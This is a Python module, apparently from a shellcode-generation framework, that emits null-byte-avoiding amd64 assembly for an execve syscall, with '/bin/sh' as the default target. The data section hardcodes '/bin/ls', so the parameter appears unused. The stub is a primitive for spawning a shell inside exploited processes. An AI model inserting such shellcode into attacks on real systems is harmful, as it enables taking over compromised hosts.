from ..BaseModule import BaseModule


class Module(BaseModule):
    @staticmethod
    def param_template():
        return {'exec_target': '/bin/sh'}

    def __init__(self):
        self.validate_exec_target = self._validate_all
        data = (
            'addr:\n'
            '    .quad 0xffffffffffffffff\n'
            'addr_eol:\n'
            '    .quad 0xffffffffffffffff\n'
            'sh:\n'
            '    .ascii "/bin/ls"\n'
            'sh_eol:\n'
            '    .byte 0xff\n'
        )
        # TODO: if /bin/sh, argv can be NULL, and skip initialisation code (saves space)
        code = (
            'execve:\n'
            '    xorq %rax, %rax\n'
            '    movb %al, sh_eol(%rip)\n'
            '    leaq sh(%rip), %rdi\n'
            '    movq %rax, addr_eol(%rip)\n'
            '    movq %rdi, addr(%rip)\n'
            '    leaq addr(%rip), %rsi\n'
            '    xorl %edx, %edx\n'
            '    # sys_execve\n'
            '    movb $59, %al\n'
            '    syscall\n'
        )

        super().__init__(
            name='Sys_execve', arch='amd64',
            code=code, data=data
        )
